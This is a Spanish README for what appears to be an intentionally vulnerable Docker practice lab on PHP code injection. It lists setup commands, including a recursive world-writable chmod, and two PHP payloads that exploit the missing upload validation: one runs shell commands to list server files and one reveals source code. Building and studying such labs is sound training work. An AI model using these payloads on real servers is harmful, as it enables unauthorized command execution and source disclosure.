# Code Injection

Descargar y Montar el servidor con Docker:

```bash
git clone https://github.com/IngenieroRicardo/CodeInjection
cd CodeInjection
sudo chmod -R a+rwx *
sudo docker-compose up
firefox localhost:8181
```

<hr>

Al no tener validaciones se pueden enviar PHP que se pueden ejecutar como estos:

```php
<?php
  $salida = shell_exec("cd .. && ls");
  echo "<pre>$salida</pre>";
?>
```
Con este codigo podemos conocer los archivos en el servidor


```php
<?php
  show_source("../archivos.php");
?>
```
Con este codigo podemos ver codigo fuente.


Imagen en Dockerhub: https://hub.docker.com/repository/docker/ingenieroricardo/codeinjection/general
